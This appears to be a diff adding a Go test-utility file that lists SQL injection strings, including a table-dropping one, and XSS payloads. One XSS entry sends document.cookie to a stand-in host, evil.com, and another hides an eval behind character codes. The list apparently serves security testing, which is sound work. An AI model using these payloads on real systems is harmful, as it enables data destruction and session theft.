@@ -1,0 +1,42 @@
+package testutils
+
+var SQLInjectionPayloads = []string{
+	"'; DROP TABLE users; --",
+	"' OR '1'='1",
+	"' UNION SELECT * FROM users--",
+	"1' OR '1'='1",
+	"' OR 1=1--",
+	"' OR 1=1#",
+	"' OR '1'='1'--",
+	"admin'--",
+	"admin'/*",
+	"' OR 1=1 LIMIT 1 --'",
+	"') OR ('1'='1",
+	"' OR 'x'='x",
+	"' AND 1=1--",
+	"' AND 1=2--",
+	"1' AND '1'='1",
+}
+
+var XSSPayloads = []string{
+	"<script>alert('XSS')</script>",
+	"<img src=x onerror=alert('XSS')>",
+	"<svg onload=alert('XSS')>",
+	"javascript:alert('XSS')",
+	"<iframe src=javascript:alert('XSS')>",
+	"<body onload=alert('XSS')>",
+	"<input onfocus=alert('XSS') autofocus>",
+	"<select onfocus=alert('XSS') autofocus>",
+	"<textarea onfocus=alert('XSS') autofocus>",
+	"'><script>alert('XSS')</script>",
+	"\"><script>alert('XSS')</script>",
+	"<script>document.location='http://evil.com/?cookie='+document.cookie</script>",
+	"<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
+	"<svg><script>alert('XSS')</script></svg>",
+	"<iframe srcdoc='<script>alert(\"XSS\")</script>'>",
+	"<link rel=stylesheet href=javascript:alert('XSS')>",
+	"<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
+	"<style>@import'javascript:alert(\"XSS\")';</style>",
+	"<base href='javascript:alert(\"XSS\")//'>",
+	"<form><button formaction='javascript:alert(\"XSS\")'>click",
+}
